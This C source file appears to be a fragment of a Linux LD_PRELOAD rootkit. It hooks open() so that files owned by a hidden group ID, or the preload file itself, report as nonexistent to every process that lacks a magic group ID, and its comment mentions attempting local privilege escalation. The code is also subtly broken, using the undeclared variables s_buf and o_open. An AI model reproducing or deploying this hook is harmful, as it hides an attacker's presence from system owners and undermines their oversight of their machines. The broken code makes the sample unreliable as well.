//
// Created by Eteli on 23/02/2022.
//

#include "utils.h"

/*
 * open() hook, check GID and preload location. Attempt LPE.
 */
int (*original_open)(const char *, int, mode_t);
int open(const char *pathname, int flags, mode_t mode) {
    struct stat s_fstat;

    original_open = dlsym(RTLD_NEXT, "open");

    if (getegid() == ESCALATED_GID)
        return original_open(pathname, flags, mode);


    memset(&s_fstat, 0, sizeof(struct stat));

    __lxstat(_STAT_VER, pathname, &s_buf);

    if (s_buf.st_gid == GID || strstr(pathname, PRELOAD)) {
        errno = ENOENT;
        return -1;
    }

    return o_open(pathname, flags, mode);
}